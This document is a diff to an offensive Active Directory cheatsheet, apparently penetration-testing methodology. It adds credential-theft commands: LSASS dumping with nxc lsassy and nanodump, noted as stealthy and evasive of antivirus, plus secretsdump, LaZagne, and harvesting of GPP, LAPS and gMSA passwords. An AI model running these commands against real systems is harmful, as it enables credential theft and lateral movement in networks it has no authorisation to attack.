@@ -108,15 +108,23 @@ First thing on any new host — understand where you are:
 
   Dump everything you can:
   ┌─────────────────────────────────────────────────────────────────┐
-  │  LSASS memory                                                  │
-  │    → plaintext passwords, NTLM hashes, Kerberos tickets       │
+  │  LSASS memory (best source — hashes, tickets, plaintext)       │
   │    → see: lsass-dumping cheatsheet                             │
+  │    → nxc -M lsassy (remote, in-memory, stealthiest)            │
+  │    → nxc -M nanodump (syscalls, good AV evasion)               │
+  │    → pypykatz lsa minidump <dump> (parse offline)              │
   │                                                                │
-  │  SAM database (local accounts)                                 │
-  │    → secretsdump or reg save + offline extraction              │
+  │  SAM + LSA in one shot                                         │
+  │    → nxc smb <target> --sam --lsa                              │
+  │    → secretsdump.py <domain>/<user>:<pass>@<target>            │
   │                                                                │
   │  Credential Manager / DPAPI / browser creds / vaults           │
   │    → see: credential-hunting cheatsheet                        │
+  │    → LaZagne.exe all (pulls from everything on the box)        │
+  │                                                                │
+  │  Autologon / deployment leftovers                              │
+  │    → registry: Winlogon DefaultPassword                        │
+  │    → files: unattend.xml, sysprep.xml                          │
   │                                                                │
   │  Cached domain creds (DCC2)                                    │
   │    → crackable offline → see: hashcat, john cheatsheets        │
@@ -126,7 +134,41 @@ First thing on any new host — understand where you are:
     • NTLM hash       → Phase 5a (pass-the-hash)
     • Kerberos TGT    → Phase 5b (pass-the-ticket)
     • Cleartext pass  → Phase 5c (direct auth, password spraying)
-    • Nothing useful  → go to Phase 6 (AD enum) and find another path
+    • Nothing useful  → Phase 4b (cred hunting, no admin needed)
+
+
+========================================================================
+ PHASE 4b — CREDENTIAL HUNTING  (you have: domain user →
+                                  you want: more/better creds)
+========================================================================
+
+  These don't need local admin. Check before going to full AD enum:
+
+  ┌─────────────────────────────────────────────────────────────────┐
+  │  Passwords in user descriptions?                               │
+  │    → nxc ldap <dc-ip> -M get-desc-users                       │
+  │    Extremely common — admins put temp passwords in descriptions │
+  │                                                                │
+  │  GPP passwords (old Group Policy Preferences)?                 │
+  │    → nxc smb <dc-ip> -M gpp_password                          │
+  │    MS published the encryption key (MS14-025). Old files linger│
+  │                                                                │
+  │  LAPS passwords readable?                                      │
+  │    → nxc ldap <dc-ip> --laps                                   │
+  │    Misconfigured ACLs let non-admins read local admin passwords│
+  │                                                                │
+  │  gMSA passwords readable?                                      │
+  │    → nxc ldap <dc-ip> --gmsa                                   │
+  │    → gMSADumper.py -u <user> -p <pass> -d <domain>            │
+  │    gMSA accounts often have high privileges                    │
+  │                                                                │
+  │  Creds in shares (scripts, configs, KeePass DBs)?              │
+  │    → nxc smb <target> --spider-shares                          │
+  │    → Snaffler.exe -s -o snaffler.log (from Windows foothold)   │
+  │                                                                │
+  │  Got something? → Phase 5 (lateral movement)                   │
+  │  Still nothing? → Phase 6 (AD enum for escalation paths)       │
+  └─────────────────────────────────────────────────────────────────┘
 
 
 ========================================================================
